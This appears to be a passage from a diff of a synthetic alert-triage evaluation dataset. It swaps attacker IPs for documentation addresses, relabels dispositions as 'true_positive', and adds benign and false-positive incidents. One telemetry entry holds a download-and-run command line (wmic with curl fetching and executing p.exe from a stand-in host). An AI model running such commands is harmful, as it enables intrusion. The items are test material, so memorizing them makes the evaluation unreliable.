      "duration_secs": 720
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1498.001"
    ],
@@ -6566,7 +6566,7 @@
      "Bytes": 8300000000
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1114.002",
     "T1567.002"
@@ -6581,7 +6581,7 @@
    "id": "INC-EVAL-155",
    "provenance": "synthetic",
    "title": "Malicious Office add-in installed for carol@example.com",
-   "description": "Office VSTO add-in registered under HKCU for carol@example.com on WIN-DC-SECONDARY; loads on every Outlook startup; beacons to 45.142.122.111.",
+   "description": "Office VSTO add-in registered under HKCU for carol@example.com on WIN-DC-SECONDARY; loads on every Outlook startup; beacons to 203.0.113.111.",
    "severity": "high",
    "raw_alert": {
     "title": "Malicious Office add-in installed for carol@example.com",
@@ -6607,11 +6607,11 @@
      "EventID": 3,
      "Computer": "WIN-DC-SECONDARY",
      "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
-     "DestinationIp": "45.142.122.111",
+     "DestinationIp": "203.0.113.111",
      "DestinationPort": 443
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1137.006",
     "T1071.001"
@@ -6621,11 +6621,11 @@
   {
    "id": "INC-EVAL-156",
    "provenance": "synthetic",
-   "title": "GitHub PAT leaked and abused from 45.142.122.111",
-   "description": "Personal access token belonging to dave@example.com used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+   "title": "GitHub PAT leaked and abused from 203.0.113.111",
+   "description": "Personal access token belonging to dave@example.com used from 203.0.113.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
    "severity": "critical",
    "raw_alert": {
-    "title": "GitHub PAT leaked and abused from 45.142.122.111",
+    "title": "GitHub PAT leaked and abused from 203.0.113.111",
     "severity": "critical",
     "template_id": "github-pat-leak"
    },
@@ -6634,7 +6634,7 @@
      "source": "github_audit",
      "action": "git.clone",
      "actor": "dave@example.com",
-     "actor_ip": "45.142.122.111",
+     "actor_ip": "203.0.113.111",
      "repo_count": 14,
      "programmatic_access_type": "personal_access_token",
      "user_agent": "git/2.40.0"
@@ -6649,7 +6649,7 @@
      "secret_detected": "github_pat_*"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1552.001",
     "T1213.003"
@@ -6664,7 +6664,7 @@
    "id": "INC-EVAL-157",
    "provenance": "synthetic",
    "title": "EC2 instance metadata service abused on WIN-PROD-WEB02",
-   "description": "IMDSv1 abused on WIN-PROD-WEB02; temporary IAM credentials for role exfilled to 91.134.231.15. CloudTrail shows AssumeRole from external.",
+   "description": "IMDSv1 abused on WIN-PROD-WEB02; temporary IAM credentials for role exfilled to 192.0.2.15. CloudTrail shows AssumeRole from external.",
    "severity": "critical",
    "raw_alert": {
     "title": "EC2 instance metadata service abused on WIN-PROD-WEB02",
@@ -6685,7 +6685,7 @@
      "eventName": "AssumeRole",
      "eventSource": "sts.amazonaws.com",
      "awsRegion": "us-east-1",
-     "sourceIPAddress": "91.134.231.15",
+     "sourceIPAddress": "192.0.2.15",
      "userIdentity": {
       "type": "AssumedRole",
       "principalId": "AIDA:role-app",
@@ -6694,7 +6694,7 @@
      "userAgent": "aws-cli/2.13"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1552.005",
     "T1078.004"
@@ -6705,7 +6705,7 @@
    "id": "INC-EVAL-158",
    "provenance": "synthetic",
    "title": "Vendor admin password reset abuse for frank@example.com",
-   "description": "Password reset for frank@example.com performed by helpdesk in response to social-engineering call from 91.134.231.15. Token claimed within 90 seconds.",
+   "description": "Password reset for frank@example.com performed by helpdesk in response to social-engineering call from 192.0.2.15. Token claimed within 90 seconds.",
    "severity": "high",
    "raw_alert": {
     "title": "Vendor admin password reset abuse for frank@example.com",
@@ -6725,12 +6725,12 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "frank@example.com",
-     "ipAddress": "91.134.231.15",
+     "ipAddress": "192.0.2.15",
      "resultType": 0,
      "seconds_after_reset": 87
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.004",
     "T1078"
@@ -6764,7 +6764,7 @@
      "resourceDisplayName": "Microsoft Graph"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1550.001"
    ],
@@ -6817,7 +6817,7 @@
      "cve_layer_count": 2
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.002",
     "T1610"
@@ -6828,7 +6828,7 @@
    "id": "INC-EVAL-161",
    "provenance": "synthetic",
    "title": "Outlook rule auto-forwarding mail from carol@example.com",
-   "description": "Outlook inbox rule created for carol@example.com that forwards all mail to external address at 185.220.101.7. Linked to LockBit 3.0.",
+   "description": "Outlook inbox rule created for carol@example.com that forwards all mail to external address at 198.51.100.7. Linked to LockBit 3.0.",
    "severity": "high",
    "raw_alert": {
     "title": "Outlook rule auto-forwarding mail from carol@example.com",
@@ -6843,14 +6843,14 @@
      "UserId": "carol@example.com",
      "Parameters": {
       "Name": "Sync",
-      "ForwardTo": "ext@185.220.101.7",
+      "ForwardTo": "ext@198.51.100.7",
       "DeleteMessage": true,
       "MarkAsRead": true
      },
      "threat_actor": "LockBit 3.0"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1564.008",
     "T1114.003"
@@ -6885,7 +6885,7 @@
      "user": "heidi@example.com"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1070.002"
    ],
@@ -6929,7 +6929,7 @@
      "secret_detected": true
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.002",
     "T1552.004"
@@ -6968,7 +6968,7 @@
      "EventCount": 128
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.004",
     "T1021.002"
@@ -7003,7 +7003,7 @@
      "LogonType": 5
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.001",
     "T1070.001"
@@ -7057,7 +7057,7 @@
      "threat_actor": "Emotet epoch 5"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.001",
     "T1059.005"
@@ -7101,7 +7101,7 @@
      "rule_match": "WAF:SSRF:2007"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1190",
     "T1082"
@@ -7142,7 +7142,7 @@
      "threat_actor": "ALPHV/BlackCat"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1189",
     "T1203"
@@ -7158,7 +7158,7 @@
    "id": "INC-EVAL-169",
    "provenance": "synthetic",
    "title": "Supply-chain compromise: malicious npm package on WIN-PROD-WEB02",
-   "description": "CI pipeline on WIN-PROD-WEB02 installed compromised npm package `event-stream`. Post-install hook executed reverse shell to 91.134.231.15. Build artefacts may be tainted.",
+   "description": "CI pipeline on WIN-PROD-WEB02 installed compromised npm package `event-stream`. Post-install hook executed reverse shell to 192.0.2.15. Build artefacts may be tainted.",
    "severity": "critical",
    "raw_alert": {
     "title": "Supply-chain compromise: malicious npm package on WIN-PROD-WEB02",
@@ -7191,11 +7191,11 @@
      "severity": "high",
      "Computer": "WIN-PROD-WEB02",
      "User": "ci-runner",
-     "dest_ip": "91.134.231.15",
+     "dest_ip": "192.0.2.15",
      "dest_port": 4444
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.001",
     "T1059.007"
@@ -7236,7 +7236,7 @@
      "CommandLine": "python.exe E:\\autorun.py --stage C:\\Temp\\"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1091",
     "T1005"
@@ -7251,7 +7251,7 @@
    "id": "INC-EVAL-171",
    "provenance": "synthetic",
    "title": "OAuth consent phishing targeting ceo@example.com",
-   "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 45.142.122.111.",
+   "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 203.0.113.111.",
    "severity": "high",
    "raw_alert": {
     "title": "OAuth consent phishing targeting ceo@example.com",
@@ -7278,12 +7278,12 @@
      "UserId": "ceo@example.com",
      "Parameters": {
       "Name": "Auto-fwd",
-      "ForwardTo": "ext@45.142.122.111",
+      "ForwardTo": "ext@203.0.113.111",
       "DeleteMessage": true
      }
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1528",
     "T1550.001"
@@ -7328,7 +7328,7 @@
      "threat_actor": "Volt Typhoon"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1059.001",
     "T1027"
@@ -7373,7 +7373,7 @@
      "Protocol": "tcp"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1105",
     "T1218.009"
@@ -7421,7 +7421,7 @@
      "user": "root"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1610",
     "T1059.004",
@@ -7468,7 +7468,7 @@
      "Destination": "powershell.exe -enc <encoded>"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1546.003",
     "T1059.001"
@@ -7511,7 +7511,7 @@
      "threat_actor": "APT29"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1547.001"
    ],
@@ -7551,7 +7551,7 @@
      "User": "svc-deploy@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1053.005"
    ],
@@ -7586,7 +7586,7 @@
      "indicator_path": "ESP:/EFI/Boot/bootx64.efi"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1542.001",
     "T1027.002"
@@ -7626,7 +7626,7 @@
      "hostname": "LIN-BUILD-CI03"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1053.003",
     "T1071.001"
@@ -7668,7 +7668,7 @@
      "User": "SYSTEM"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1548.002"
    ],
@@ -7731,7 +7731,7 @@
      "user": "root"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1611",
     "T1082"
@@ -7775,7 +7775,7 @@
      "user": "carol@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1548.001"
    ],
@@ -7828,7 +7828,7 @@
      "threat_actor": "ALPHV/BlackCat"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1055.012",
     "T1620"
@@ -7872,7 +7872,7 @@
      "CommandLine": "wevtutil cl Security"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1070.001"
    ],
@@ -7922,7 +7922,7 @@
      "User": "bob@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1562.001"
    ],
@@ -7967,7 +7967,7 @@
      "User": "svc-deploy@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1003.001"
    ],
@@ -8010,7 +8010,7 @@
      "riskLevelAggregated": "high"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1110.003"
    ],
@@ -8055,7 +8055,7 @@
      "IpAddress": "WIN-FIN-DB01"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1558.003",
     "T1021.001"
@@ -8091,7 +8091,7 @@
      "ClientIP": "LIN-OBS-LOGGER"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1003.006",
     "T1078.002"
@@ -8142,7 +8142,7 @@
      ]
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1606.002",
     "T1087.002"
@@ -8188,7 +8188,7 @@
      "EventCount": 8400
     }
    ],
-   "expected_disposition": "benign",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1087.002"
    ],
@@ -8232,7 +8232,7 @@
      "EventCount": 256
     }
    ],
-   "expected_disposition": "benign",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1135"
    ],
@@ -8276,7 +8276,7 @@
      "threat_actor": "Lazarus"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1550.002",
     "T1558.001"
@@ -8312,7 +8312,7 @@
      "EventTimeUTC": "03:14:00Z"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1021.001"
    ],
@@ -8326,7 +8326,7 @@
    "id": "INC-EVAL-195",
    "provenance": "synthetic",
    "title": "WMI lateral execution from WIN-FILE-SHARE to LIN-DB-REPLICA",
-   "description": "wmic.exe /node:LIN-DB-REPLICA process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 91.134.231.15.",
+   "description": "wmic.exe /node:LIN-DB-REPLICA process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 192.0.2.15.",
    "severity": "high",
    "raw_alert": {
     "title": "WMI lateral execution from WIN-FILE-SHARE to LIN-DB-REPLICA",
@@ -8342,10 +8342,10 @@
      "Computer": "WIN-FILE-SHARE",
      "User": "svc-backup@example.com",
      "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
-     "CommandLine": "wmic /node:LIN-DB-REPLICA process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
+     "CommandLine": "wmic /node:LIN-DB-REPLICA process call create \"cmd /c curl http://192.0.2.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1047"
    ],
@@ -8378,7 +8378,7 @@
      "bytes": 10700000000
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1005",
     "T1041"
@@ -8422,7 +8422,7 @@
      "User": "heidi@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1115"
    ],
@@ -8454,7 +8454,7 @@
      "qps": 240
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1071.004",
     "T1048.003"
@@ -8469,7 +8469,7 @@
    "id": "INC-EVAL-199",
    "provenance": "synthetic",
    "title": "Cloud storage exfil: data egress to attacker-controlled S3 from K8S-PROD-CLUSTER",
-   "description": "Egress from K8S-PROD-CLUSTER to s3://atk-stage-45.142.122.111/dump/ by alice@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+   "description": "Egress from K8S-PROD-CLUSTER to s3://atk-stage-203.0.113.111/dump/ by alice@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
    "severity": "critical",
    "raw_alert": {
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from K8S-PROD-CLUSTER",
@@ -8488,17 +8488,17 @@
      },
      "sourceIPAddress": "K8S-PROD-CLUSTER",
      "requestParameters": {
-      "bucketName": "atk-stage-45.142.122.111",
+      "bucketName": "atk-stage-203.0.113.111",
       "key": "dump/customers.tar.gz"
      },
      "resources": [
       {
-       "ARN": "arn:aws:s3:::atk-stage-45.142.122.111/dump/customers.tar.gz"
+       "ARN": "arn:aws:s3:::atk-stage-203.0.113.111/dump/customers.tar.gz"
       }
      ]
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1567.002"
    ],
@@ -8532,7 +8532,7 @@
      "file_count": 812
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1567.002",
     "T1005"
@@ -8541,6 +8541,2481 @@
     "disable_user",
     "suspend_user",
     "block_user_signin"
+   ]
+  },
+  {
+   "id": "INC-BENIGN-001",
+   "provenance": "synthetic",
+   "title": "PsExec service installed on WIN-DB-07",
+   "description": "psexesvc.exe installed and started on WIN-DB-07 by svc-patching@example.com at 02:14 local. Source host WIN-MGMT-01.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1569.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "PsExec service installed on WIN-DB-07",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-DB-07",
+     "Image": "C:\\Windows\\PSEXESVC.exe",
+     "User": "EXAMPLE\\svc-patching",
+     "ParentImage": "C:\\Windows\\System32\\services.exe",
+     "UtcTime": "2026-03-04T02:14:11Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041288",
+     "window_start": "2026-03-04T02:00:00Z",
+     "window_end": "2026-03-04T04:00:00Z",
+     "approver": "platform-oncall@example.com",
+     "summary": "Quarterly database patch rollout, wave 3"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-002",
+   "provenance": "synthetic",
+   "title": "Encoded PowerShell from build agent LIN-CI-04",
+   "description": "powershell.exe -EncodedCommand observed on WIN-BUILD-02, parent process the Jenkins agent service.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1059.001",
+    "T1027"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Encoded PowerShell from build agent LIN-CI-04",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-BUILD-02",
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "CommandLine": "powershell.exe -NoProfile -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQA",
+     "ParentImage": "C:\\Program Files\\Jenkins\\jenkins-agent.exe",
+     "User": "EXAMPLE\\svc-jenkins"
+    },
+    {
+     "source": "vcs",
+     "repository": "example/platform-deploy",
+     "file": "scripts/deploy.ps1",
+     "note": "Encoding is how the pipeline passes a multi-line script through the agent."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-003",
+   "provenance": "synthetic",
+   "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+   "description": "Sequential TCP connections to 1,024 ports across 2,300 hosts in eleven minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1046"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_ip": "198.51.100.40",
+     "distinct_dst": 2300,
+     "distinct_ports": 1024,
+     "duration_seconds": 660
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.40",
+     "hostname": "vulnscan-prod-01.example.com",
+     "owner": "security-engineering@example.com",
+     "role": "authenticated vulnerability scanner",
+     "scan_schedule": "weekly, Sundays 01:00-05:00 UTC"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-004",
+   "provenance": "synthetic",
+   "title": "Mass file read by backup agent on FS-CORP-02",
+   "description": "48,000 file reads in 20 minutes by a single process on the corporate file server.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1005",
+    "T1074.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Mass file read by backup agent on FS-CORP-02",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "FS-CORP-02",
+     "Image": "C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe",
+     "User": "EXAMPLE\\svc-backup",
+     "files_touched": 48000,
+     "window_minutes": 20
+    },
+    {
+     "source": "edr",
+     "process_signed": true,
+     "signer": "Veeam Software Group GmbH",
+     "network_destinations": [
+      "198.51.100.70"
+     ]
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-005",
+   "provenance": "synthetic",
+   "title": "LDAP enumeration from LIN-IAM-SYNC01",
+   "description": "12,400 LDAP queries enumerating users, groups and group membership in six minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1087.002",
+    "T1069.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "LDAP enumeration from LIN-IAM-SYNC01",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4662,
+     "Computer": "DC01.example.com",
+     "SubjectUserName": "svc-scim-sync",
+     "query_count": 12400,
+     "window_minutes": 6
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "LIN-IAM-SYNC01",
+     "role": "SCIM provisioning connector",
+     "runs_every": "15 minutes"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-006",
+   "provenance": "synthetic",
+   "title": "Impossible travel for j.okafor@example.com",
+   "description": "Sign-in from London then Singapore 40 minutes apart.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1078.004"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Impossible travel for j.okafor@example.com",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "j.okafor@example.com",
+     "client_ip": "198.51.100.12",
+     "geo": "London, GB",
+     "ts": "2026-03-04T08:02:00Z"
+    },
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "j.okafor@example.com",
+     "client_ip": "203.0.113.88",
+     "geo": "Singapore, SG",
+     "ts": "2026-03-04T08:42:00Z"
+    },
+    {
+     "source": "network",
+     "ip": "203.0.113.88",
+     "note": "Corporate egress gateway, APAC region. Traffic egresses here when the VPN reconnects."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-007",
+   "provenance": "synthetic",
+   "title": "New privileged account created: svc-terraform-runner",
+   "description": "Account created and added to Domain Admins outside business hours.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1136.002",
+    "T1098"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "New privileged account created: svc-terraform-runner",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4720,
+     "Computer": "DC01.example.com",
+     "TargetUserName": "svc-terraform-runner",
+     "SubjectUserName": "svc-provisioning",
+     "ts": "2026-03-04T23:40:00Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041301",
+     "approver": "iam-lead@example.com",
+     "summary": "Provision infrastructure-automation service account, approved at CAB 2026-02-27"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-008",
+   "provenance": "synthetic",
+   "title": "Bulk outbound email from 198.51.100.55",
+   "description": "22,000 messages to external recipients in one hour.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1114.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Bulk outbound email from 198.51.100.55",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "m365_audit",
+     "Operation": "Send",
+     "sender": "campaigns@example.com",
+     "message_count": 22000,
+     "window_minutes": 60
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.55",
+     "hostname": "mkt-sendgrid-relay.example.com",
+     "role": "marketing email relay"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-009",
+   "provenance": "synthetic",
+   "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+   "description": "mimikatz.exe executed by t.nakamura@example.com.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1003.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-SEC-LAB01",
+     "Image": "C:\\Tools\\mimikatz.exe",
+     "User": "EXAMPLE\\t.nakamura"
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "WIN-SEC-LAB01",
+     "role": "detection-engineering lab, isolated VLAN, no domain trust",
+     "owner": "detection-engineering@example.com"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-010",
+   "provenance": "synthetic",
+   "title": "Scheduled task created on 140 hosts",
+   "description": "Identical scheduled task written across 140 endpoints within four minutes.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1053.005"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Scheduled task created on 140 hosts",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4698,
+     "TaskName": "\\Example\\EndpointInventory",
+     "host_count": 140,
+     "window_minutes": 4,
+     "SubjectUserName": "svc-sccm"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041312",
+     "summary": "Roll out endpoint inventory collector to the finance OU"
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-001",
+   "provenance": "synthetic",
+   "title": "Ransomware file-extension activity on WIN-HR-21",
+   "description": "Rule matched 400 files renamed to a known ransomware extension.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1486"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Ransomware file-extension activity on WIN-HR-21",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "WIN-HR-21",
+     "TargetFilename": "D:\\archive\\2019-payroll.7z.locked",
+     "Image": "C:\\Program Files\\7-Zip\\7zG.exe",
+     "User": "EXAMPLE\\m.alvarez"
+    },
+    {
+     "source": "edr",
+     "note": "Files were renamed by an archival script appending '.locked' as its own marker.",
+     "entropy_change": "none",
+     "ransom_note_found": false
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-002",
+   "provenance": "synthetic",
+   "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+   "description": "Periodic outbound HTTPS matching a threat-intel indicator.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1071.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "proxy",
+     "src_host": "WIN-FIN-09",
+     "dst_domain": "malware-c2.example.net",
+     "interval_seconds": 300,
+     "bytes_out": 412
+    },
+    {
+     "source": "threatintel",
+     "indicator": "malware-c2.example.net",
+     "note": "Sinkholed by the registrar in 2024; the IOC feed never expired the entry.",
+     "first_seen": "2023-11-02",
+     "sinkholed": true
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-003",
+   "provenance": "synthetic",
+   "title": "Brute force against svc-monitoring from 198.51.100.90",
+   "description": "620 failed authentications in ten minutes.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1110.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Brute force against svc-monitoring from 198.51.100.90",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4625,
+     "TargetUserName": "svc-monitoring",
+     "IpAddress": "198.51.100.90",
+     "failure_count": 620,
+     "Status": "0xC000006A"
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.90",
+     "hostname": "nagios-01.example.com",
+     "note": "Credential rotated 2026-03-03; the monitoring host kept the old secret in its config."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-004",
+   "provenance": "synthetic",
+   "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+   "description": "Large sustained outbound transfer to an external address.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1048"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_host": "LIN-APP-12",
+     "dst_ip": "198.51.100.200",
+     "bytes_out": 15032385536,
+     "duration_minutes": 46
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.200",
+     "hostname": "artifact-mirror.example.com",
+     "note": "Internal artifact mirror. Classified external by the rule because it sits outside the RFC1918 ranges the rule checks."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-005",
+   "provenance": "synthetic",
+   "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+   "description": "Office application spawned a command shell.",
+   "severity": "high",
